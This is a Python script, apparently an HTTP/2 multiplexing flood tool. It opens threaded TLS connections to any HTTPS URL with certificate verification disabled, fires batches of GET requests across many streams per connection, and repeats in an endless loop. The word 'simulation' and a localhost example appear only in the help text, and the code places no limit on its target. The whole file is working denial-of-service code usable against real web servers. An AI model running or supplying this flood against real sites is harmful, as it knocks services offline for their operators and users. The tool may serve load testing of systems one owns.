import argparse
import threading
import ssl
import socket
import time
from urllib.parse import urlparse
from h2.connection import H2Connection

def flood_worker(scheme, host, port, path, stream_count, delay, thread_id):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.set_alpn_protocols(['h2'])

    while True:
        try:
            sock = socket.create_connection((host, port))
            tls = context.wrap_socket(sock, server_hostname=host)

            negotiated = tls.selected_alpn_protocol()
            if negotiated != 'h2':
                print(f"[Thread-{thread_id}] ALPN negotiation failed: {negotiated}")
                tls.close()
                continue

            conn = H2Connection()
            conn.initiate_connection()
            tls.sendall(conn.data_to_send())

            # Receive server preface
            data = tls.recv(65535)
            conn.receive_data(data)
            tls.sendall(conn.data_to_send())

            # Send multiple GET requests on separate streams
            for stream_id in range(1, stream_count * 2, 2):
                headers = [
                    (':method', 'GET'),
                    (':scheme', scheme),
                    (':authority', host),
                    (':path', path),
                    ('user-agent', f'h2-multiplex-flood-thread-{thread_id}')
                ]
                conn.send_headers(stream_id, headers, end_stream=True)
                tls.sendall(conn.data_to_send())
                if delay > 0:
                    time.sleep(delay)

            open_streams = set(range(1, stream_count * 2, 2))

            # Read loop: wait for all streams to finish
            while open_streams:
                data = tls.recv(65535)
                if not data:
                    # Connection closed unexpectedly
                    break
                events = conn.receive_data(data)
                tls.sendall(conn.data_to_send())

                for event in events:
                    if hasattr(event, 'stream_id') and event.stream_id in open_streams:
                        if event.__class__.__name__ == 'StreamEnded':
                            open_streams.discard(event.stream_id)

            print(f"[Thread-{thread_id}] Batch of {stream_count} streams completed. Repeating...")

            tls.close()

        except Exception as e:
            print(f"[Thread-{thread_id}] Exception: {e}")
            time.sleep(1)  # small delay before reconnecting


def main():
    parser = argparse.ArgumentParser(description="HTTP/2 Multiplexing Flood Simulation (Infinite Loop)")
    parser.add_argument('--url', required=True, help='Target URL (e.g., https://127.0.0.1:443/path)')
    parser.add_argument('--streams', type=int, default=10, help='Streams per connection')
    parser.add_argument('--threads', type=int, default=1, help='Number of concurrent threads (connections)')
    parser.add_argument('--delay', type=float, default=0.0, help='Delay between streams in seconds')
    args = parser.parse_args()

    parsed_url = urlparse(args.url)
    if parsed_url.scheme != 'https':
        print("Only HTTPS URLs are supported.")
        return

    host = parsed_url.hostname
    port = parsed_url.port or 443
    path = parsed_url.path or '/'

    threads = []
    for i in range(args.threads):
        t = threading.Thread(
            target=flood_worker,
            args=(parsed_url.scheme, host, port, path, args.streams, args.delay, i + 1),
            daemon=True
        )
        t.start()
        threads.append(t)

    try:
        while True:
            time.sleep(1)  # Keep main alive, threads run in background
    except KeyboardInterrupt:
        print("\nStopping...")

if __name__ == '__main__':
    main()

